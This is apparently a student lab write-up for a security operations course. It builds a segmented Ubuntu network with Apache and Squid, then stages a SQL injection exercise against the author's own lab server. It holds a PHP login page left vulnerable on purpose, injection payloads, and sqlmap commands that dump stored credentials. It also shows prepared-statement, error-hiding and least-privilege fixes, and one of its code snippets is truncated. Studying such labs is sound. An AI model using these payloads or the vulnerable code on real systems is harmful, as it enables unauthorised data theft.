# Cybersecurity-Operations-SOC-
## Activity 1: DMZ Network Setup

**Purpose:** Establish the foundational network infrastructure that all subsequent activities depend on.

**What was built:** Four Ubuntu 22.04 LTS virtual machines were provisioned within Hyper-V on Microsoft Azure and connected across three isolated network segments, forming the segmented lab topology required for the entire project.

| **VM** | **Role** | **Network Segment** |
| --- | --- | --- |
| ExternalGateway | Border router and NAT gateway | ExternalNetwork + DMZNetwork |
| InternalGateway | Internal router and DNS/VPN host | DMZNetwork + InternalNetwork |
| UbuntuServer | Service host (web, email, DNS) | DMZNetwork |
| UbuntuDesktop | Client machine for testing | InternalNetwork |

**Configuration steps:**

- Static IP addresses assigned to all VMs via netplan

![Netplan config ExternalGateway](img/image3.png)

![Netplan config InternalGateway](img/image2.png)

![Netplan config UbuntuServer](img/image4.png)

- IP forwarding enabled on both gateway VMs 

```
net.ipv4.ip_forward=1 in /etc/sysctl.conf
```

![IP forwarding configuration](img/image1.png)

- NAT configured on ExternalGateway using iptables MASQUERADE on eth0, allowing all internal VMs to reach the internet through the gateway's public IP

```
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```

**Verification:** All VMs successfully pinged each other across segments, and internet access was confirmed from UbuntuDesktop by loading the Griffith University website in a browser.

![Verification ping and internet access](img/image5.png)

**Key services:** Hyper-V virtual switches, Netplan, IP forwarding, iptables MASQUERADE 

**Running on:** ExternalGateway and InternalGateway

-

## Activity 2.1: Secure Web Server

**Purpose:** Deploy a production-style HTTPS web server with encrypted traffic and controlled proxy access for internal clients.

**What was built:** Apache2 was installed on UbuntuServer (192.168.1.80) and configured to serve web content over both HTTP and HTTPS. A Squid forwarding proxy was installed on InternalGateway to manage and control outbound web access for internal network clients.

| Component | Detail |
| --- | --- |
| Web server | Apache2 on UbuntuServer (192.168.1.80) |
| Certificate | Self-signed, 2048-bit RSA, 365 days (OpenSSL) |
| Protocol | HTTPS port 443, TLS 1.2 minimum |
| Proxy | Squid on InternalGateway, port 8080 |

**Configuration steps:**

- Apache2 installed and custom web page created at `/var/www/html/index.html`

![Apache2 installation and web page](img/2-image1.png)

- Self-signed TLS certificate generated using OpenSSL and applied to Apache2 via `default-ssl.conf`

![TLS certificate generation](img/2-image2.png)

- Strong cipher suites enforced and legacy protocols (SSLv2, SSLv3, TLS 1.0/1.1) disabled in `ssl-params.conf`

![Cipher suite configuration](img/2-image3.png)

- Squid installed on InternalGateway and configured to listen on port 8080 as a forwarding proxy

![Squid installation](img/2-image4.png)

- Squid proxy configured to permit internal network requests only and block Australian websites during office hours (9am–5pm)

![Squid proxy configuration](img/2-image5.png)

**Verification:** The web page was confirmed loading over both http://192.168.1.80 and https://192.168.1.80 in a browser on UbuntuDesktop. HTTPS traffic was captured on port 443, confirming the payload was encrypted. Squid access logs confirmed web pages were being cached and the Australian website block was active during office hours.

![Verification screenshot](img/2-image6.png)

**Key services:** Apache2, OpenSSL (TLS 1.2+), Squid proxy (port 8080)

**Running on:** UbuntuServer (192.168.1.80) and InternalGateway (192.168.1.1)

## Sprint 1: SQL Injection

## Target: Apache2 Web Server (192.168.1.80)

## Exploit Public-Facing Application

SQL Injection inserts malicious SQL code into input fields to manipulate the database behind a web application. In this sprint, you will create a vulnerable PHP login page on Apache2, exploit it manually and using sqlmap, then extract database credentials as evidence.

## Prerequisites:

- Activity 2b (Web Server) fully complete
- Apache2 running on UbuntuServer (192.168.1.80)
- UbuntuDesktop can access `http://192.168.1.80` in browser
- DNS Server configured and working (Activity 2a)
- Internet access available on UbuntuServer for package installation

This is the focused Sprint 1 manual.

- Prerequisites: Confirm Apache2 and DNS are working
- Setup: Install PHP, MySQL and create the vulnerable login page
- Attack steps: 8 steps from manual injection to full sqlmap dump
- Evidence: exactly what to screenshot for your report
- Defense: 5 mitigations with working code examples

---

## Setup: Prepare the vulnerable environment

## Step 1: Install PHP and MySQL on UbuntuServer

PHP is needed to create a dynamic web form. MySQL is the database the attack will target.

```
sudo apt install php php-mysql mysql-server libapache2-mod-php -y
sudo systemctl start mysql
sudo systemctl enable mysql
```

![Install PHP and MySQL](img/s1-image15.png)

![MySQL service status](img/s1-image5.png)

Verify with:

```
php -v
sudo systemctl status mysql
```

![Verify PHP and MySQL](img/s1-image1.png)

---

## Step 2: Create a test database with user credentials

This creates the database that the SQL injection will extract data from.

```
sudo mysql -u root

# Inside MySQL shell:
CREATE DATABASE testdb;
USE testdb;
CREATE TABLE users (
  id INT,
  username VARCHAR(50),
  password VARCHAR(50)
);
INSERT INTO users VALUES (1,'admin','secret123');
INSERT INTO users VALUES (2,'student','pass456');
SELECT * FROM users;
EXIT;
```

![Create database](img/s1-image12.png)

![Database table](img/s1-image13.png)

Inside MySQL, run these commands:

```
CREATE USER 'webuser'@'localhost' IDENTIFIED BY 'password';
GRANT ALL PRIVILEGES ON testdb.* TO 'webuser'@'localhost';
FLUSH PRIVILEGES;
EXIT;
```

![Create webuser](img/s1-image17.png)

---

## Step 3: Create a vulnerable PHP login page

This page is intentionally vulnerable. It inserts user input directly into the SQL query without any validation.

```
sudo nano /var/www/html/login.php
```

```php
<?php
$conn = mysqli_connect('localhost', 'webuser', 'password', 'testdb');
if (!$conn) {
    die('Connection failed');
}
$user = $_GET['user'];
$query = "SELECT * FROM users WHERE username='$user'";
$result = mysqli_query($conn, $query);
if(mysqli_num_rows($result) > 0){
    while($row = mysqli_fetch_array($result)){
        echo 'Welcome: ' . $row['username'] . '<br>';
        echo 'Password: ' . $row['password'];
    }
} else {
    echo 'User not found';
}
mysqli_close($conn);
?>
```

![Vulnerable login page](img/s1-image6.png)

---

## Step 4: Enable Apache2 to run PHP

Restart Apache2 so it picks up the PHP module:

```
sudo systemctl restart apache2

# Test the page loads correctly:
curl 'http://localhost/login.php?user=admin'
```

![Apache2 restart](img/s1-image4.png)

Result:

```
Welcome: admin
Password: secret123
```

---

## Attack steps - execute in order:

- **Open the vulnerable page on UbuntuDesktop**

Open Firefox and navigate to the login page with a normal username:

```
http://192.168.1.80/login.php?user=admin
```

![Normal login page](img/s1-image22.png)

- **Test basic SQL injection: Bypass login**

Replace `admin` in the URL with a SQL injection payload. This tricks the query into returning all users:

```
http://192.168.1.80/login.php?user=' OR '1'='1
```

![Basic SQL injection](img/s1-image9.png)

- **Test comment-based injection**

This payload comments out the rest of the SQL query after the username:

```
http://192.168.1.80/login.php?user=admin'%23
```

![Comment-based injection](img/s1-image3.png)

- **Install sqlmap on UbuntuDesktop**

sqlmap is an automated SQL injection tool that can detect and exploit vulnerabilities:

```
sudo apt install sqlmap -y
sqlmap --version
```

![Install sqlmap](img/s1-image21.png)

- **Run sqlmap to detect vulnerability and list databases**

Point sqlmap at the vulnerable parameter. Answer yes to any prompts:

```
sqlmap -u "http://192.168.1.80/login.php?user=admin" --dbs --batch
```

![sqlmap list databases](img/s1-image19.png)

- **List tables inside testdb**

Now drill into the testdb database to find its tables:

```
sqlmap -u "http://192.168.1.80/login.php?user=admin" -D testdb --tables --batch
```

![sqlmap list tables](img/s1-image7.png)

- **Dump all data from the users table**

Extract all usernames and passwords from the users table:

```
sqlmap -u "http://192.168.1.80/login.php?user=admin" -D testdb -T users --dump --batch
```

![sqlmap dump users](img/s1-image20.png)

- **Save sqlmap output as evidence**

Save the terminal output to a file for your attack report:

```
sqlmap -u "http://192.168.1.80/login.php?user=admin" -D testdb -T users --dump --batch > ~/sqli_evidence.txt
cat ~/sqli_evidence.txt
```

![sqlmap evidence file](img/s1-image18.png)

![sqlmap evidence output](img/s1-image8.png)

---

## MITRE ATT&CK Reference

Go to the MITRE ATT&CK page: https://attack.mitre.org/techniques/T1190/

The SQL injection attack is classified under MITRE ATT&CK technique **T1190 (Exploit Public-Facing Application)**, which describes adversaries exploiting vulnerabilities in internet-facing applications to gain unauthorised access. In this sprint, the vulnerable `login.php` page hosted on Apache2 was exploited using manual SQL injection payloads and sqlmap to extract credentials from the testdb database, demonstrating a realistic attack scenario aligned with real-world adversarial techniques.

---

## Mitigation & Defense Strategies

Never insert user input directly into SQL queries. Parameterised queries separate data from code completely, making injection impossible.

```php
prepare("SELECT * FROM users WHERE username=?");
$stmt->bind_param("s", $_GET['user']);
$stmt->execute();
$result = $stmt->get_result();
?>
```

---

## Defense 1: Prepared Statements (fixes the vulnerability directly)

```
sudo nano /var/www/html/secure-login.php
```

```php
<?php
$conn = mysqli_connect('localhost', 'webuser', 'password', 'testdb');
$user = $_GET['user'];
$stmt = $conn->prepare("SELECT username, password FROM users WHERE username=?");
$stmt->bind_param("s", $user);
$stmt->execute();
$result = $stmt->get_result();
if($result->num_rows > 0){
    while($row = $result->fetch_array()){
        echo 'Welcome: ' . $row['username'] . '<br>';
    }
} else {
    echo 'User not found';
}
?>
```

![Prepared statements](img/s1-image23.png)

Test it:

```
curl "http://localhost/secure-login.php?user=' OR '1'='1"
```

Output: `User not found`

![Prepared statements test](img/s1-image2.png)

---

## Defense 2: Disable PHP Error Display

```
sudo nano /etc/php/8.3/apache2/php.ini
```

Find and change:

```
display_errors = Off
log_errors = On
```

![PHP error display](img/s1-image14.png)

Verify it is working:

Test with a broken PHP file to confirm errors are hidden:

```
echo "<?php mysqli_connect('wrong','wrong','wrong','wrong'); ?>" | sudo tee /var/www/html/errortest.php
curl http://localhost/errortest.php
```

![Error display verification](img/s1-image10.png)

Restart Apache2:

```
sudo systemctl restart apache2
```

Blank page - no error shown to the attacker. Attackers can no longer see database error messages.

PHP error display was verified to be disabled on the web server (`display_errors = Off`), preventing attackers from obtaining sensitive database information through error messages. Error logging is enabled (`log_errors = On`) ensuring errors are recorded server-side for administrative review without exposing details to end users.

---

## Defense 3: Least Privilege Database Account

Currently `webuser` has full access to the database - they can read, write, delete and modify everything. This is dangerous because if an attacker exploits SQL injection, they can do maximum damage.

Least privilege means giving the web application only the minimum permissions it needs - in this case, only SELECT (read) access.

```
sudo mysql -u root

# Inside MySQL:
REVOKE ALL PRIVILEGES ON testdb.* FROM 'webuser'@'localhost';
GRANT SELECT ON testdb.users TO 'webuser'@'localhost';
FLUSH PRIVILEGES;
SHOW GRANTS FOR 'webuser'@'localhost';
EXIT;
```

![Least privilege configuration](img/s1-image11.png)

Test the restriction is working:

```
sudo mysql -u webuser -ppassword -e "DROP TABLE testdb.users;"
```

![Least privilege test](img/s1-image16.png)

Output: `ERROR 1142: DROP command denied to user 'webuser'@'localhost'`

This proves `webuser` can no longer destroy the database even if an attacker gains access.

---

## Summary

This sprint demonstrated how a poorly coded PHP login page hosted on Apache2 can be exploited through SQL injection, allowing an attacker to bypass authentication and extract sensitive credentials directly from the database using both manual payloads and sqlmap. The attack was documented under MITRE ATT&CK **T1190 (Exploit Public-Facing Application)**.

Three mitigations were implemented and verified: prepared statements to separate user input from SQL code, PHP error display disabled to prevent information leakage, and least privilege database permissions to limit the damage an attacker can cause even if access is gained. Together these controls directly address the root causes of the vulnerability and reflect secure coding and database hardening practices standard in real-world SOC environments.

